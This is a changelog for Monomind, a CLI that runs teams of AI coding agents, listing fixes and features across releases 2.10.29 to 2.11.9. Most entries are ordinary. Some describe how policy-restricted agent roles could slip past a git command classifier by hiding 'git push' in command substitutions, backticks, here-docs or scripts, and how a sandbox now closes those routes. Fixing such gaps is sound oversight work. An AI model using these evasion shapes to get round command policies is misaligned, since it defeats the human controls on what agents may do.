# Changelog

All notable changes to Monomind (`monomind` umbrella + `@monoes/monomindcli`).

## [Unreleased]

## [2.11.9] — 2026-09-19

### Fixed

- A clean `npm install monomind` no longer reports the four high-severity `sharp<=0.35.4-rc.0` advisories. `@huggingface/transformers` is bumped from `^3.8.1` to `^4.3.0`: 3.8.1 declares `sharp: ^0.34.1`, so **no** version inside its range is safe and neither an `overrides` entry nor a sibling floor could fix it — a sibling floor made npm nest a second vulnerable copy. 4.3.0 declares `sharp: ^0.35.4`, and a consumer-style `npm audit` against it reports zero vulnerabilities. Real-world exposure was low (both advisories require processing untrusted image input, and monomind only ever hands transformers text), but the dependency-graph risk and the audit noise were real (#266: ae98ff27e).
- The local embedding loader in `embedding-operations.ts` now pins `dtype: 'q8'`, matching `memory-bridge.ts`. Since transformers v4 the default is fp32 (`onnx/model.onnx`), which the provisioning step never fetches — leaving it unset would have failed every load under `local_files_only` and silently degraded semantic search to the 128-dim hash fallback (#266).
- The `Second Brain Model` doctor check looked for `.cache/Xenova`, a model the bridge no longer uses, and so reported "Embedding model not downloaded yet" with a fully provisioned cache on disk. It now checks for `BRIDGE_EMBEDDING_MODEL`. Its fix hint also pointed at `monomind doc search`, which passes `local_files_only` and never downloads anything; it now names `monomind doc eval --provision-model`, the one command that does (#266).

### Note for existing installs

- The model cache lives at a version-keyed path inside `node_modules`, so this bump orphans any warm cache. Re-provision once with `monomind doc eval --provision-model` (~270MB); until then semantic search falls back to keyword matching, which `monomind doctor` now reports accurately.

## [2.11.8] — 2026-09-18

### Added

- `monomind org status --json` now says when the idle watchdog will stop a running org: `idle_stop_at` (ISO-8601), `idle_stop_in_seconds`, and `idle_hold`, which names the reason when there is no deadline (`disabled`, `restarting`, `pending-gate`, `pending-question`, `pending-approval`, `endpoint-reply-due`, `task-blocked`, or `unknown` when this run's daemon has not reported yet). Previously the watchdog's clock lived only in daemon memory, so a UI could show how long an item had been waiting but not how long was left to answer it. The daemon publishes the projection to `<org>/idle-watchdog.json` only when it changes, and deletes it on stop. It uses a file rather than a bus event because any bus event counts as activity and would reset the clock it reports. The hold reasons come from the same check that decides whether the watchdog waits, so the report cannot drift from its behaviour. Advertised as capability `org-idle-deadline` (#296: bc19b0f3d).

## [2.11.7] — 2026-09-18

### Added

- The org bus now carries a `tool_result` event when a tool call completes, so "did that command work?" is a field rather than an inference from the agent's own narration — a `Bash` running a test suite previously looked identical on the bus whether it passed, failed, or the binary was missing. Correlated to its invocation by the SDK's per-call id (so two concurrent `Bash` calls from one role stay distinct), carrying `ok`, duration and output capped at 4,000 characters with `redactSecrets` applied **before** the cut and truncation signalled structurally. Typed as `ToolResultEventData` in `types.ts` rather than an ad-hoc literal; runners that cannot observe tool completion simply never emit it (#289: a4bcf86e6).
- Decision traces carry a structured `kind` (`fence-block`, `gate-pending`, `policy-deny`, `approval-pending`, `approval-resolved`, `cross-org-handoff`, …). A prompt-injection fence block and a routine wait for human approval previously emitted identical structured fields, distinguishable only by matching English prose. The field is required in `recordDecision`'s signature, so the compiler guarantees every emitter populates it — which covered four emitters, not the two originally reported (#290: 071a64618).

### Fixed

- Org run memory was silently dropped when the memory backend could not load: `bridgeStoreEntry` returns `null`, `storeRunMemory` ignored it, and its caller's `catch` never fired because nothing threw. Runs completed normally, `runtime.json` and history were written, the bus looked perfect — and every `org_recall` came back empty, with the only trace printed under `MONOMIND_DEBUG=1`. A failed store now surfaces three ways that outlive the terminal: an `org-memory-store-failed` audit event, an unconditional warning, and a `memoryError` field in `runtime.json` that `org status` prints (human and `--format json`). It deliberately does not throw — by then the run has succeeded and its history is on disk, so throwing would fail a run that worked and blame history for it. The same swallowed-`null` pattern was fixed in four more callers, two of which actively misreported: `hooks post-command` returned `recorded: true` for a write that never happened *and* skipped its JSON fallback (losing the record twice), and a consolidation worker counted patterns it never wrote (#293: bc75ea501).
- `policy.git` denials now name the boundary and the allowed alternative, not just the rejected attempt. "path escapes org workdir" never said what the workdir was, so a role could only guess another path — in one rehearsal a reviewer's single `Read` was denied, it never learned the root it ran under, and it reviewed from submission messages without reading a line of code. Five denial messages fixed: workdir escape, write-scope, path-less `Grep`/`Glob`, tool allowlist and research-domain allowlist (#291: 3911a5e16).
- `monomind org branch <org> <run> <label>` read as though `<label>` named the new run; the id is generated, and the label was not merely a note — it was discarded entirely, never reaching `.branch-source`. The label is now recorded, `--format json` prints the generated id (`{"v":1,"org":…,"run":…,"from":…,"label":…}`) so a script can replay without parsing prose, and the help no longer shows a label in the id position. The label is deliberately NOT used as the run id: run ids are joined into filesystem paths and the codebase already guards that shape against traversal (#292: f4c08a3d0).
- `biome` linted nothing inside `.claude/worktrees`, which is where this repo's own workflow puts worktrees: `npx biome check` reported "Checked 0 files" and naming a file said the path was ignored. A "lint is clean" reading was really "biome refused to look" — CI was unaffected, but anyone working the recommended way was misled. The ignore pattern now excludes the `.claude` assets without excluding a worktree checkout's own source, with a repo test asserting both directions (#294: 71b3e1700).

### Changed

- `scripts/sync-claude-trees.mjs` (`pnpm run sync:claude-trees`, with `--check` in `verify` and CI) keeps the five `.claude` asset trees canonical after `init` marks files in this repo. It normalises rather than mirrors: the shipped `packages/@monomind/cli/.claude` is init's asset *source*, so copying the marked root copy into it would ship per-project markers to every npm user and make the next `init` nest a second block inside the first. It never creates and never deletes, which is how the shipped superset is protected structurally. The dead `sync-claude-assets.sh` (a hard `exit 1` since July, still referenced by three checklists) is deleted, and the parity test, skill lint and `doc/publishing.md` now name the real command (42cb52e65).
- `@monoes/hooks` 1.0.6 → 1.0.7 (the consolidation-worker fix above).

## [2.11.6] — 2026-09-18

### Fixed

- **An org you stopped could come back to life ~10 seconds later.** When a boss agent crashes, the runtime arms an auto-restart timer (10s backoff by default); when it fired it re-checked only whether a stop was *in flight*, which is never true by then, since a stop completes in far less time. Stopping an org with a restart pending therefore resurrected it: fresh sessions spending budget, `runtime.json` rewritten to `running`, a process `exit` handler re-registered, and nothing left that would ever stop it again (in a deterministic test, one stop was followed by three starts). The timer now also requires the org to still be registered — which distinguishes the two cases exactly, since a crashed boss leaves the org registered while an operator stop removes it (793e7c75f).
- `finishStop` snapshotted the resume checkpoint before releasing the run's process `exit` listener, watchdog interval and broker lease. A throw in between — which a half-started org can provoke, as it may lack the state the snapshot expects — aborted the stop and left all three behind for a run that no longer existed, and nothing surfaced it because `startOrg`'s teardown path swallows a rejecting `stopOrg` to report its own error. The three releases now happen first and both checkpoint captures are best-effort: a run that cannot be checkpointed must still stop and clean up (#288: 44b5ebb2e).

Both bugs showed up as the same CI symptom — a leaked process listener in the half-started-org test — and each was independently necessary: the run carrying only the second fix still failed.

## [2.11.5] — 2026-09-18

### Fixed

- **2.11.4 shipped the monograph fix from #279/#280 that nobody could use.** `@monoes/monograph` stayed at 1.6.4 — the version already on npm from five days earlier — while only the CLI and umbrella were bumped. Every sibling is pinned `workspace:*`, which pnpm resolves at pack time to the version that package declares, so the published CLI depended on the pre-fix tarball: `GroupedConst`/`GroupedVar` were still missing from the graph on a clean install. This release publishes `@monoes/monograph` 1.6.5 (the fix), `@monoes/routing` 1.0.5 (25 changed source files, unpublished since 2.9.24) and `monofence-ai` 1.0.3. `scripts/check-package-bumps.mjs` now fails the build — and `tests/repo/publish-bumps.test.ts` fails CI — when a publishable package has commits touching shipped files since its version was last set (#285: 4dd18df6e).
- `init --force` appended a marked copy of each skill file instead of wrapping the content already there — the same defect #276 fixed for `CLAUDE.md`, still present in the skills writer. In this repo `codex-tools.md` went 64 → 130 lines with its body present twice; six reference files doubled. The skills writer now shares #276's managed-block primitive: an older unmarked skill file is migrated in place, repeated runs are byte-identical, and a project already damaged by 2.11.4 heals back to one copy on the next `init --force`. A block belonging to another platform in a shared skill root is never absorbed (#286: e8284a668).
- `init --force` rewrote `.monomind/config.yaml` and `.monomind/CAPABILITIES.md` on every run purely to update their `Generated:` timestamp, dirtying the repo for no actionable information. When the timestamp is the only difference the file is now left untouched, mtime included; a real content change still writes and refreshes the stamp (e5a9d0238).
- The `.claude` tree the CLI ships had drifted from the root tree: 2.11.4's regenerated `settings.json` (post-bash and notification hooks, longer pre-write timeout) reached maintainers but not installed users. Synced, and the duplicated skill files 2.11.4's init produced are restored (499a90133, 08f9083c4).

### Changed

- `tests/repo/publish-bumps.test.ts` and `scripts/check-package-bumps.mjs` discover publishable packages rather than listing them, so a new package is covered the day it is added; tests and markdown do not count as shipped code, and a manifest-only commit counts only when a key consumers actually resolve changed. `MONOMIND_ALLOW_STALE_PACKAGES=1` is the escape hatch for a package that genuinely ships nothing (#285).
- The hook-order test now derives its fixture from the settings template instead of the repo's own `.claude/settings.json`, which it had required to be out of date (6adf50809).

## [2.11.4] — 2026-09-18

### Fixed

- `monomind hooks list` rendered `Priority`, `Executions` and `Last Executed` columns that nothing populates — and "Never" was actively false, e.g. the `route` hook had 500 recorded runs. Priority exists only in an in-memory registry production code never fills; there is no per-hook last-executed timestamp; and the counters that do exist are keyed by *handler*, a different name space (only 6 of 24 registry names overlap, so a join would be guesswork). The three dead columns are gone, and the real per-handler counts now appear as a "Handler invocations" section under the existing Claude Code wiring block — omitted entirely when no data has been recorded, rather than shown as zeros (e4e1fd2be).
- Four `overrides` blocks (root `package.json`, and the cli, mcp and monograph packages) were never applied but read as protection: pnpm v10 takes workspace overrides from `pnpm-workspace.yaml`, and the blocks had silently diverged from it. Every entry was either byte-identical to the live one or, in the case of `ws: "$ws"`, unresolvable — the root package declares no `ws` dependency for that syntax to match — so all four are removed with no constraint ported or weakened (`pnpm why` output for every affected package is identical before and after, and the lockfile is untouched). `scripts/check-overrides-source.mjs`, wired into `check:versions` and `prepublishOnly`, now fails when any manifest declares `overrides`/`resolutions`, reporting per entry whether it is redundant, disagrees with the applied range, or is a constraint applied nowhere (#284: 010254f96).

### Changed

- Docs cite source by symbol (`[\`orgrt/daemon.ts → startOrg\`](…/daemon.ts#startOrg)`) instead of by line number. 97 of the 200 line references in the living docs were already wrong, and `OrgDaemon` — hand-corrected to L438 a day earlier — had already moved to 444. Symbol anchors only break when a symbol is renamed or deleted, and `scripts/check-doc-refs.mjs` (wired into `verify`) then fails by name; it also rejects any reintroduced `#L<n>` anchor. 200 references converted across 13 docs, 3 dead file paths repaired. The 134 references under `doc/reports/` are left as they are: each report states the commit it was reviewed at, so its line numbers are pinned rather than rotting (b9bc46552).
- Tracked platform assets regenerated with 2.11.3: managed-block delimiters applied in place on `CLAUDE.md`, `AGENTS.md`, `.agents/shared_instructions.md` and the 14 `.claude` skill files; `CLAUDE.md` now matches the detected stack (`/packages` and pnpm, not `/src` and npm); `.claude/settings.json` gains the post-bash and notification hooks; `.kimi-code` agents drop `mode: subagent`, an opencode-only field the kimi generator ignores by design (b3b2d3397).

## [2.11.3] — 2026-09-18

### Fixed

- `hooks post-task --success true|false` recorded the wrong thing entirely: the argument parser set a declared boolean flag to `true` and left the literal `true`/`false` in the positionals, where `ctx.args[0] || ctx.flags['task-id']` picked it up as the task ID. On the invocation CLAUDE.md documents, `--task-id abc --success false` printed `Task false recorded as successful` — the real ID discarded and a *failed* task recorded as a success. A declared boolean flag now consumes an immediately following `true`/`false`; bare `--flag`, `--no-flag` and combined short flags are unchanged. This affected every boolean flag in the CLI (#269: 7c573b672).
- `mcp start --daemon` was a no-op — the flag was read, passed to the server options, and never consulted — so `-d` blocked the terminal; and an unref'd 5s force-exit watchdog in `bin/cli.js` killed *every* `mcp start`, foreground included, about 6s after startup (measured). `-d` now re-execs detached with output to `~/.monomind/mcp.log` and reports the child's own PID, and the watchdog exempts a foreground server. `mcp stop` also only deleted the PID file for a daemon, leaving it running and unreachable; it now signals the recorded PID (#267: d4354f84b).
- `mcp status` always reported `stdio`, `localhost` and port 3000 because nothing about the running server was recorded — a separate status process only had its own defaults, which also aimed the health probe at the wrong port. The server now writes its transport/host/port beside the PID file (#268: 73c16d9d8).
- `hooks list` showed every hook as "Enabled: No": the table rendered an `enabled` column the static registry never populated. Hooks now report their real state, and the separate Claude Code event wiring in `.claude/settings.json` is reported as its own labelled section (#270: ca5413378).
- `CopilotAgentRunner` always reported 0 tokens, so a copilot role looked free and its budget cap could never engage. Usage is now read from the CLI's `--usage-output-file` JSON and summed across tool-fence rounds; `cost_usd` is deliberately left unset because copilot meters in AI credits and premium requests, never USD. The same work uncovered that the runner extracted **no assistant text at all** — the real NDJSON nests payloads under `data`, which none of the four checked shapes matched (#181: ef60e0b55).
- `monomind org status` called a live run "crashed" whenever its recorded pid was stale (the pid is persisted only at start and stop, so re-attaching leaves one that answers to nothing). Liveness now falls back to the daemon heartbeat and then to recent bus activity, and says which evidence proved it live; JSON consumers still see only `running`/`crashed` (#274: 1bb4a0a9d).
- `org_task` auto-dispatch delivered only the task title when an `org_send` briefing was issued in the same turn: they were two mailbox pushes and a role consumes one per turn, so the briefing always arrived a turn late. Both now arrive as one message (500ms coalescing window, `DISPATCH_COALESCE_MS`) (#275: 0207cadbd).
- The release-gate org's hygiene step ("empty TMPDIR") could delete the scratch of the session running it — the shared temp dir also holds the agent harness's own per-session state, and wiping it broke a coordinator's shell mid-run. Hygiene is now narrow and run-scoped, with a test that fails if a wholesale-delete instruction is reintroduced into the shipped config (#273: 5b0c2931f).
- `monograph build` failing on a better-sqlite3 ABI mismatch gave advice that could not work: under a global install the loaded binary sits in the install tree, so `npm rebuild` from the project rebuilds a different copy — which is why repeated rebuilds left the file byte-identical. monomind now names the exact binary, the Node ABI it disagrees with, and the one command in the one directory that fixes it; it rebuilds automatically when the tree is writable (`MONOMIND_NO_NATIVE_REBUILD=1` opts out) and pins PATH to the running Node so the rebuild targets the right ABI; `doctor` gained a Native modules check that detects it without needing a crashed build's log (#231: e736fa6f3).
- The monobrowse `close-browser` test could hang until its 60s timeout and fail an unrelated CI job: it drove a real filesystem read with fake timers, so all 60 advances burned 120,000 fake ms in ~50ms of real time and the process-exit poll never started, leaving an unsettled promise nothing could drive. The wait is now event-driven, and a timed-out run can no longer leak a real `SIGKILL` past `restoreAllMocks` (#283: fcf1f8ccb).
- `doc/commands/security.md` and the `security` command's own subcommand list advertised a `container` scan type that hard-errors "not implemented"; removed from both (#271: feee3ce2a).
- `doc/concepts/org-runtime.md` listed 6 of the 14 accepted `runtime` values (`grok` and `hermes` were the reported gap; 8 were missing) and documented `max_turns_per_message` as defaulting to 30 when the real default is 100,000 — the knob people reach for when a role is cut off. Also corrected `idle_minutes`' effective default, the role `id` constraint (that regex governs org names, not role ids), the deprecated `gemini`/`openai` provider kinds, and stale line references (#272: b5aa32cb6).

### Note for upgraders

2.11.2's `init --force` fix migrates in place: a project initialised by an older monomind has an unmarked generated body in its `CLAUDE.md` (and `.agents/shared_instructions.md`), and the first `init --force` on 2.11.2+ replaces that body and wraps it in the current `<!-- monomind-block:… -->` delimiters instead of appending a second copy. Text you wrote outside the generated block is preserved in place; an already-doubled file heals back to one copy.

## [2.11.2] — 2026-09-18

### Fixed

- `init --force` appended a second complete copy of the managed instructions to `CLAUDE.md` (230 lines became 455 in this repo, every rule stated twice) for any project initialised before the `<!-- monomind-block:… -->` delimiter existed: the writer recognised only its own current delimiter, so an older unmarked generated body read as user content and a fresh block was appended on every run. The merge primitive now also recognises the older `# monomind:start <marker>` pair and an unmarked generated body (matched structurally, conservatively — anything not provably generated terminates the region rather than being swallowed), replaces it in place, and migrates it to the current delimiter; an already-doubled file heals back to one copy, and repeated `init --force` runs are byte-identical. Same primitive backs `.agents/shared_instructions.md` (#276: 22918c7bd).
- Every `monomind platforms` subcommand printed nothing at all — `doctor`, `plan`, `install`, `upgrade`, `uninstall`, `setup`, `docs` and even its error paths formatted their output with the colour helpers that *return* a styled string and discarded it, so `platforms doctor --platform claude` (which `doctor` tells you to run) wrote 0 bytes and exited 0. They now print (#277: e2c29d7a4).
- `platforms doctor` reported all 16 platforms as `legacy` immediately after a fresh install: legacy ownership matched any `monomind:start` marker without requiring the old *unnamed* form, and flagged the shared skill roots (`.agents/skills`, `.gemini/skills`) on mere existence though they are the current portable layout. Because `platforms install --all` gates migration on the same predicate, it was rewriting current blocks and leaving stray marker-name lines in `CLAUDE.md`/`AGENTS.md`. A fresh install now reports 0 findings (#277: e2c29d7a4).

## [2.11.1] — 2026-09-17

### Added

- **Org runtime**: every role now gets an explicit `adapter_config.model` when an org is created (mastermind-createorg templates, `org create`, and `init`'s sample org) — the user's choice, or else the latest model for its runtime (`claude-sonnet-5` for Claude, vendor defaults from `VERCEL_PROVIDERS` otherwise) — closing the drift where an unset model silently followed whatever the runtime's own default happened to be (3a6a4bca8).
- Memory: entity resolution now tolerates common name-spelling variants (`Node.js` vs `nodejs`, case/separator/plain-plural differences) via a new coarser `mergeKey` fold, validated on a blind-labeled benchmark at F0.5 0.775 vs 0.480 for the previous exact-match identity — wired in as a purely additive second index alongside the existing exact-match one, so it can only ever promote or flag a candidate, never merge two differently-typed entities on its own (PR #260: 0450ecc97, 13d87a905).
- Memory: the ettin reranker can now score without a self-exported PyTorch/ONNX build — a pure-JS classifier head (fetched by `doc eval --provision-model`) restores real reranking (measured Recall@5 0.458 vs 0.396 dense-only) instead of silently falling back to unranked order (PR #259: 75f265136).

### Fixed

- **Org runtime / policy.git sandbox enforcement (#258, #262, #263)**: `policy.git` was previously enforced only by classifying Bash command text, which couldn't see git reached as data, through scripts, `node -e`, npm scripts, or non-Claude runtimes' native shells. Roles below `push` now get a real git guard (blocked credentials/hooks/protocols) plus, on the Claude runtime, an OS-level sandbox; codex and grok's own sandbox flags are now wired to the same policy, and the opencode runner's server now actually receives the role's scoped session env instead of the daemon's own (4c9ea05bb #258, 2215c3d4b, 4c96c8106, 3c3de1b12, 7c68fe2bf, 31ec5b2fe #263, 0265112a1 #262, dbb33006b, d23bc81a0, b812038f3).
- **Git command classifier gaps (#250, #257, #261)**: closed several ways a policy-gated role could reach `git push`/`git commit`/`git config` writes without detection — command substitutions hiding a git call (`$(git push)`, backticks, here-docs, arithmetic) (#257: 334f7977f), four shell shapes the scanner previously gave up on and denied wholesale (case arms, `${...}` quoting, arithmetic shifts, here-docs) (#261: c70369941), and `git config` write/read misclassification against real git argument parsing (#250: f61236962, 2a433982c).
- **Org daemon/session reliability**: a role's task-dependency graph no longer lets `org_task_done` complete a task whose dependencies aren't done, which could dispatch downstream work (e.g. a final build) before docs/version-bump work had landed (#246: b473d6633). A crashed SDK session now actually resumes its prior conversation on auto-restart instead of starting cold (#247: 95e11e0e7). A stopped run's unanswered `ask_human` questions no longer leak into the next run (#248: fb671e6cd). Monomind-internal env vars (`MONOMIND_SDK_AGENT`, `MONOMIND_HOOK_QUIET`, `MONOMIND_GRAPH_GATE`, `MONOMIND_NO_LOCAL_EMBEDDINGS`) no longer leak into every Bash command an org role runs, which had been silently changing hook/graph-gate/memory-search behavior mid-role (#249: c503fc0fb, fd862dd75). Idle roles aborted by a normal `org_complete`/stop no longer get logged and alerted as crashes (#251: 659dd252c). The Claude runtime's default model no longer drifts to a stale `claude-sonnet-4-5` fallback (#252: 25ddccd61). Org logs/status/questions/approvals timestamps are now explicitly marked UTC (`Z` suffix) instead of printing bare local-looking times (#253: 0bfe07921). `org run` now applies a reload request queued in the same tick as a stop, and clears a stale one at start (#254: 38cc8df28, 00215d3c3). A stuck/silent session attempt's internal abort no longer poisons the whole role slot's retry loop (#256: 027265060). `org run`/`org serve` no longer act on a stop/reload request left over from a previous daemon (#264: d5ef39fa9). Restored clearing a stale pending approval on a fresh (non-resume) org start, regressed since #165 (f6a0d9b8f).
- `monomind autopilot log` entries are now marked UTC (`Z`) instead of printing an unlabelled local-looking time, matching #253's fix for the org runtime's own logs (#265: 3185ad220).
- `monomind monograph watch` (and the background watcher `init --watch` starts) never fired for a project under a dot-directory or an ancestor named `dist/`/`build/`/`node_modules` — ignore patterns are now matched against the repo-relative path instead of the absolute one (#255: b1d2c2534).
- Every pricing table (model-pricing, dashboard collector/server, token trackers) priced `claude-sonnet-5` like Sonnet 4.6 ($3/$15 instead of its real $2/$10 per MTok), overstating org cost estimates and budget-cap usage by 50%; `claude-fable-5-1` also gains a pricing row ($10 in / $50 out, cache reads $0.25/MTok) so its usage is no longer reported unpriced (17a42e29c).
- This run's fixes, verified independently against a clean environment: security `scan`/`secrets` now actually reads file contents instead of always reporting "no issues found" (6085a72e8); top-level `search --type code` now returns results instead of always "No results found" (f10bc3250); `mcp start` now honors `--help`/`--transport`/`--port` instead of silently starting a hardcoded stdio server, and `mcp status`/`mcp health` can now see a bare `mcp start` via a PID file — 3 findings, one root cause (862780762); `config set --help`'s own first example now works instead of failing "Required option missing" (469c8f4a8); `analyze diff --risk`/`--classify` no longer print literal "undefined" for Type/Category/Subcategory/Reasoning (77604550a); `monograph search`'s text-mode table now shows a Line column, matching `--format json` (fd9f9ed95); `graph-report-gaps.test.ts`/`graph-report-confidence.test.ts` no longer hardcode `/tmp` for their output path, which fails with EROFS in any sandboxed/read-only-tmp environment (0902c91e4).

### Changed

- Replaced `claude-sonnet-4-6` model defaults/aliases with `claude-sonnet-5` across pricing tables, the dashboard adapters endpoint, the statusline label, and all five mastermind skill trees' recommendations (3b0cd3fb9); centralized the default Claude model into one exported constant instead of four hard-coded copies, refs #252 (f0be2c5cc); pinned every release-gate role explicitly to the latest model (ec767087f).
- `session.ts`'s hand-maintained per-vendor model-default table was replaced with a direct read of the `VERCEL_PROVIDERS` registry, removing a second list that could drift from the first (f23444572).
- `policy.ts` (861 lines) split into `shell-scan.ts` and `policy-git.ts`, with behavior unchanged (7f150bf3f).
- The release-gate org config is now tracked in the repo at `config/orgs/release-gate.json` instead of existing only on one machine (6978f8db8).
- The `mastermind-review` skill and its command docs now explicitly trigger on plain-language "review this session/worktree" phrasing, not just the literal slash command (bce80ecd5).
- Internal milestone notes recorded the org-run-reload fix and a worktree cleanup sweep, and corrected a stale version label (4650438d3, 45a198412).
- Docs and site content updated for 2.11.1 (e5b402648).

## [2.11.0] — 2026-09-17

### Breaking Changes

- **MCP tools**: Removed the deprecated `graphify_*` tool shims (122c55ebb). Callers still using these deprecated names (`graphify_build`, `graphify_query`, `graphify_god_nodes`, `graphify_get_node`, `graphify_shortest_path`, `graphify_community`, `graphify_stats`, `graphify_surprises`, `graphify_suggest`, `graphify_visualize`, `graphify_watch`, `graphify_watch_stop`, `graphify_report`, and `graphify_health`) must switch to the equivalent `monograph_*` tool.

### Fixed

- `monomind cleanup --force` now only reaps genuinely orphaned SDK processes (c4d430669, 01e38236c). Previously, cleanup invoked without an ownerPid would SIGTERM every process matching "claude-agent-sdk --output-format" machine-wide, including live org agents with running parent processes, causing mass crashes. Now only kills processes whose parent is PID 1 (classic init adoption) or matches an init/subreaper pattern (`systemd`, `systemd --user`, `/sbin/init`, `/lib/systemd/systemd`), correctly identifying orphans on both traditional init systems and modern systemd user sessions while never killing SDK processes with live application parents.
- `monomind init --force` now properly migrates pre-rename projects (7dd8deb26). Previously, projects initialized before the graphify→monograph rename never fully migrated: the old `graphify-freshen.cjs` hook file stayed on disk forever, and even after `--force` refreshed `settings.json`, the old command survived as a duplicate SessionStart hook (looked 'unknown' next to the newly generated `monograph-freshen.cjs` command). Now obsolete helper files are deleted and obsolete hook commands are stripped from settings before the merge, so migration completes in one `init --force`.

### Changed

- Renamed "graphify" to "monograph" throughout the codebase (8cd1b8851). This product's own knowledge graph is branded Monograph (`@monoes/monograph`, `monograph.db`, `monograph_query`, …) — several internal names never got the memo:
  - SessionStart hook: `graphify-freshen.cjs` → `monograph-freshen.cjs` (root `.claude`, `.gemini`, packaged copies, and all generator/wiring references)
  - `InitComponents.graphify` / `MCPConfig.graphify` → `.monograph`
  - Various internal function names and comments
- Root CI now builds monobrowse before typecheck (96e8a56fb). Root typecheck scans every package under `packages/**`, and `@monoes/monobrowse/src/cli/platform.ts` self-imports `@monoes/monobrowse`, which only resolves once the package has built its own `dist/`.

## [2.10.31] — 2026-09-17

### Added

- Agent-exec protocol rev 7: `result.text` always carries the complete final reply (#245, commit 16ae966db). Since rev 5's incremental `assistant` events, clients that read `result.text` got only the last streamed chunk.
- Org runtime, mono-agent integration M1–M5 (see `doc/concepts/org-runtime.md`): role tool providers (`tool_providers`), endpoint roles (`kind: "endpoint"`), operator-authenticated cross-org delivery with a live org inbox, decision attribution with request-scoped approvals, and cross-root federation allowlists.

### Fixed

- Biome lint fixes (305d7f820) — unused imports, `useIndexOf` and `useOptionalChain` findings.
- `analyze diff` no longer crashes when the risk breakdown is incomplete (293fdc4a6); hook, memory-search and graph-gate tests no longer inherit `MONOMIND_SDK_AGENT`, `MONOMIND_HOOK_QUIET`, `MONOMIND_NO_LOCAL_EMBEDDINGS` or `MONOMIND_GRAPH_GATE` from the calling process, so they pass when run inside an agent session.
- monobrowse's close-browser force-kill test no longer inherits agent-session environment variables (51c00ed6b) — test-only change.
- `monomind status`: the System Resources table no longer fails silently with "Resource governor not available" on every real machine; an unbound `output.*` method reference lost its receiver (4af9f55bc).
- `monomind browse open` now exits 1 with the navigation error when `Page.navigate` fails (e.g. `net::ERR_CONNECTION_REFUSED`) instead of reporting success against Chrome's error page (a6a412e89).
- SessionStart hook: the monograph freshen hook only runs `npm root -g` when no faster install location resolves, saving ~65 ms per session start (cf73f664e).
- SubagentStart/SubagentStop hooks no longer wait ~3 s on the capture handler's stdin fallback timer (037674994).

### Changed

- `@monoes/monobrowse` bumped from 1.0.8 to 1.0.9 for the `browse open` navigation-failure fix.
- Root `build` now builds every workspace package, and `typecheck`, `test:run` and `test:all:run` scripts were added for a non-watch build/test/lint gate (2f509f29a).

## [2.10.30] — 2026-09-15

### Added

- `runtime: 'hermes'` — a new `AgentRunner` backed by Nous Research's
  Hermes Agent CLI (`hermes`), following `CodexAgentRunner`'s
  fresh-spawn-per-tool-round pattern. Headless `hermes` has no
  session-resume flag, so the full transcript is resent every tool-call
  round rather than relying on `resume <threadId>`. Live-verified against
  a real installed binary, which caught two bugs a docs-only design had
  missed: `--usage-file` is a top-level `-z`-only flag (invalid on
  `chat`, so usage always reports 0, matching `vercel-runner.ts`'s
  existing `cost_usd:0` precedent), and `-Q`/`--quiet` can still leak a
  warning line onto stdout ahead of the real answer (stripped
  defensively). The org-tool fence protocol does not yet round-trip with
  Hermes's own native tool-call syntax — documented as a known follow-up,
  not silently papered over.

### Changed

- Incremental (per-token/per-chunk) text streaming is now gated behind
  `extras.includePartialMessages` consistently across every subprocess
  `AgentRunner` (`antigravity`, `opencode`, `pi-rpc`, `qwen-rpc`),
  matching the opt-in pattern `ClaudeAgentRunner` already used.
  `antigravity-runner.ts`'s streaming was previously unconditional; the
  org runtime (`session.ts`) wants one complete message per step
  regardless of which runner backs a role and never opts in, so it was
  unintentionally getting fragments before this. `pi-rpc-runner.ts` gains
  incremental streaming for the first time, via
  `message_start`/`message_update`/`message_end` events (not
  independently live-tested end-to-end — no funded model credential was
  available in the verifying environment; sourced from the bundled
  protocol spec rather than inference). Opt-in and additive throughout:
  default (non-streaming) behavior is unchanged everywhere.

### Fixed

- `doctor`'s "Graph freshness" check could keep reporting a native-module
  build failure (e.g. a `better-sqlite3` ABI mismatch) as *current* long
  after the real problem was already fixed — `build.log` is append-only,
  so a stale historical failure kept getting re-surfaced until the next
  successful `monograph build` happened to overwrite it. The check now
  resolves the implicated package from disk and compares its own
  most-recently-modified file against the log entry; when the package is
  demonstrably newer than the log, the check downgrades to a warning
  noting the discrepancy instead of asserting the problem is still live.
  Fixes #244.
- The ABI-mismatch diagnostic message now suggests
  `npm rebuild <module> --build-from-source` and a full package
  reinstall (not just clearing `build/`) for the specific "rebuild never
  changes the binary at all" symptom reported in #231 — a cached
  prebuilt asset being silently reused instead of a real from-source
  compile is the most likely mechanism for a very new Node major with no
  matching prebuilt release yet. Does not claim to fully resolve #231:
  the exact environment (Node v26 + a pre-existing stale-ABI binary)
  couldn't be reproduced to confirm it, so #231 stays open pending
  confirmation.

## [2.10.29] — 2026-09-14

### Fixed

- `monomind init --force` on a Go/Rust/Python repo that also had an
  incidental root `package.json` (e.g. one only declaring a tooling
  dependency) got misclassified as JavaScript/TypeScript, because
  `detectProjectProfile` let that `package.json` unconditionally set
  `language` before `go.mod`/`Cargo.toml`/`pyproject.toml` were even
  checked. `--force` then fully overwrote `CLAUDE.md` and
  `.agents/shared_instructions.md` with generic JS boilerplate (npm
  build/test commands that don't exist in the target repo), discarding
  hand-authored, stack-specific content. Go/Rust/Python markers now outrank
  an incidental `package.json`, and the generated "Install dependencies"
  line branches on the detected language instead of unconditionally
  assuming `packageManager: npm`. `writeClaudeMd`/`writeSharedInstructions`
  also now confine their generated output to a delimited
  `<!-- monomind-block:... -->` region (`mergeGeneratedBlock`, `shared.ts`)
  instead of overwriting the whole file on `--force`, replacing just that
  block in place on repeat runs. Note: a project whose `CLAUDE.md` /
  `shared_instructions.md` predates this fix has no such marker yet, so its
  first `--force` under 2.10.29 appends the refreshed block after the
  existing content rather than overwriting it — safe (nothing is lost) but
  the file grows once until the pre-existing copy above the marker is
  manually trimmed; every `--force` after that first one replaces only the
  marked block in place. Fixes #241.
- `doctor`'s platform report treated every capability-gated artifact
  (`experimental`/`cli_fallback` platforms that intentionally skip writing
  an artifact, per #216's parity model) the same as a genuinely missing
  one. `PlatformDoctorReport.artifacts[]` now carries a `gated` state and a
  `reason`, via a new `KIND_CAPABILITY` map, so `doctor` can tell "gated by
  design" apart from "actually broken." Fixes #240.
- `system_health` (MCP) and `doctor` (CLI) checked different candidate
  paths for config and memory-DB health, so the two could disagree about
  whether the same install was healthy. Both now read from shared
  `CONFIG_JSON_CANDIDATE_PATHS`/`CONFIG_YAML_CANDIDATE_PATHS`/
  `MEMORY_DB_CANDIDATE_PATHS` constants. Fixes #239.
- `adm-zip` bumped to `>=0.6.1` (both `package.json` and the
